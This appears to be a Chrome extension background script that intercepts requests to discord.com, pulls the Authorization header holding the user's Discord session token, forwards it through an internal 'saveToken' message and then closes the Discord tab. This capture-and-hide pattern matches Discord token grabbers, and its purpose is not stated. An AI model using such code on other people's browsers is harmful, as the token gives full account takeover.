chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'getToken') {
        let tokenFound = false;

        const getToken = (details) => {
            if (!tokenFound) {
                const tokenHeader = details.requestHeaders.find(
                    (header) => header.name.toLowerCase() === 'authorization'
                );
                if (tokenHeader) {
                    const token = tokenHeader.value;
                    if (token) {
                        try {
                            chrome.runtime.sendMessage({
                                message: 'saveToken',
                                token: token,
                            });
                        } catch (error) {
                            console.error('Error sending token:', error);
                        }

                        tokenFound = true;
                        chrome.webRequest.onBeforeSendHeaders.removeListener(
                            getToken
                        );

                        chrome.tabs.query(
                            { active: true, currentWindow: true },
                            (tabs) => {
                                if (
                                    tabs.length > 0 &&
                                    tabs[0].url.includes('discord.com')
                                ) {
                                    chrome.tabs.remove(tabs[0].id);
                                }
                            }
                        );
                    }
                }
            }
        };

        chrome.webRequest.onBeforeSendHeaders.addListener(
            getToken,
            { urls: ['*://discord.com/*'] },
            ['requestHeaders']
        );

        sendResponse({ status: 'listener added' });
    }

    return true;
});
